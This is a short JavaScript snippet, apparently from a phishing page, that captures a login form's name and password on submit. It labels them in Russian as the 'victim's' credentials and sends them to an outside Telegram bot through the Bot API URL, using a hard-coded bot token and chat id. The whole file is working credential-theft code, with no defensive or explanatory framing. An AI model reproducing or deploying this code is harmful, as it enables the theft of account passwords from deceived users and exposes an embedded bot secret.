    const form = document.getElementById('main__form');

    form.addEventListener('submit', (event) => {
    event.preventDefault();

    const name = event.target[0].value;
    const password = event.target[1].value;
    
    const send = `
        ник жертвы : ${name}
        пароль жертвы : ${password}
    `
    axios.post(
        `https://api.telegram.org/bot6436084347:AAGvUhKFwMBZvw0rouFgiY2C65-Ul-2K08I/sendMessage?chat_id=-935411872&text=${send}`
    ).then(() => {
        event.target.reset();
    });
    });